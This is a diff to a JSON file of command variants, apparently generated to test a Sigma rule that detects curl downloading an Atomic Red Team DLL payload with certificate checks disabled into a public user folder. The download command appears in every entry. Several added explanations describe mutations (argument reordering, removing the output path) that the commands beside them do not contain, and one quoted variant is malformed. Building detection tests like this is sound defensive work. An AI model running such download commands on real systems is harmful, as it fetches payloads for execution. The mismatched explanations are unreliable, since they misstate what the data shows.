@@ -1,14 +1,22 @@
 [
   {
     "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll",
-    "explanation": "The original command is already a true positive for the Sigma rule. No mutation is needed."
-  },
-  {
-    "output": "C:\\Windows\\System32\\Curl.exe -k\" https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll\" -o c:\\users\\public\\music\\allthethingsx64.dll",
-    "explanation": "Inserted quotes around the URL to test if the detection is affected by string parsing variations."
+    "explanation": "The original command is already a true positive. No mutation is needed to trigger the Sigma rule."
   },
   {
     "output": "C:\\Windows\\System32\\Curl.exe --insecure https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll",
-    "explanation": "Replaced the short flag '-k' with the long flag '--insecure' to test if the detection is affected by flag representation."
+    "explanation": "The '--insecure' flag is a direct equivalent of the '-k' flag. This substitution preserves the insecure transfer behavior and should still trigger the Sigma rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k\" https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll\" -o c:\\users\\public\\music\\allthethingsx64.dll",
+    "explanation": "Inserting quotes around the URL is a safe mutation technique that does not change the behavior of the command. The '-k' flag is still present and should trigger the Sigma rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll",
+    "explanation": "Reordering the arguments does not affect the behavior of the command. The '-k' flag is still present and should trigger the Sigma rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll",
+    "explanation": "Removing optional elements such as the output path does not affect the insecure transfer behavior. The '-k' flag is still present and should trigger the Sigma rule."
   }
 ]
